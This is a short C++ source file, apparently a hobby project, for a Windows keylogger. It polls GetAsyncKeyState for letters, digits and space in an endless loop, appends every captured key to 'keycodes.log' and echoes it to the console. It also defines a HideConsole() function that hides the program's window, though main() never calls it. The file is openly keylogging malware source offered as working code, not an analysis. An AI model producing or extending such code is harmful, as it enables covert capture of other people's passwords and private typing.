﻿#include <iostream>
#include <cctype>
#include <string>
#include <fstream>
#include <stdio.h>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

/*
ofstream CreateLog(string dirFile, string nameFile)
{
	string path = dirFile + nameFile;
	ofstream logFile(path);
	return logFile;
}
*/

void StartWrite(int listVKey[], const int keyList, string path, int symCount, int symLimit)
{
	ofstream logFile;

	logFile.open("keycodes.log", ios::app);

	while (true)
	{
		if (logFile.is_open())
		{

			if (symCount == symLimit)
			{
				logFile << "\n";
				symCount = 0;
			}

			int pressCount = 0;
			for (int i = 0; i < keyList; i++)
			{

				if ((GetAsyncKeyState(listVKey[i])) && (pressCount == 0))
				{
					pressCount = 1;
					symCount++;
					if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
					{
						char symbol = (char)listVKey[i];
						logFile << symbol;
						cout << symbol;
					}
					else
					{
						char lower = tolower(listVKey[i]);
						logFile << lower;
						cout << lower;
					}


					Sleep(100);
					break;
				}
				else if (GetAsyncKeyState(listVKey[i]) == 0) pressCount = 0;
			}
		}
	}
}

int main()
{
	bool running = true;
	const int keyList = 37;
	int symLimit = 100;
	int symCount = 0;
	int arrVKey[keyList] = { 0x20,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A };

	string dirFile = "D:/c++Projects/KeyLogger/";
	string nameFile = "keycodes.log";
	string path = dirFile + nameFile;

	StartWrite(arrVKey, keyList, path, symCount, symLimit);
}